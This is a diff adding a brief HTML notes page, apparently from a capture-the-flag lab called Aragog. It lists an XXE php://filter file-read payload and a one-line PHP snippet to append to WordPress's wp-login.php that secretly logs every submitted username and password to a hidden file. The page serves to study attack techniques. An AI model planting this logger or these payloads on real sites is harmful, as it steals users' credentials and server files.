@@ -1,0 +1,15 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Aragog - XXE PHP Filters WP Keylog</title>
+</head><body>XXE example payloads in PayloadAllTheThings<br/>
+<br/>
+php://filter/convert.base64-encode/resource=<br/>
+<br/>
+<br/>
+Control the source of an application:<br/>
+&nbsp;&#09;Login pages: grab passwords, write to locations or overwrite passwords, etc<br/>
+<br/>
+Password logger for wordpress: wp-login.php, appended after case 'login' : default:<br/>
+&nbsp;&#09;file_put_contents(".PleaseSubscribe", $_POST['log'] . ":" . $_POST['pwd'] . "\n", FILE_APPEND);</body></html>
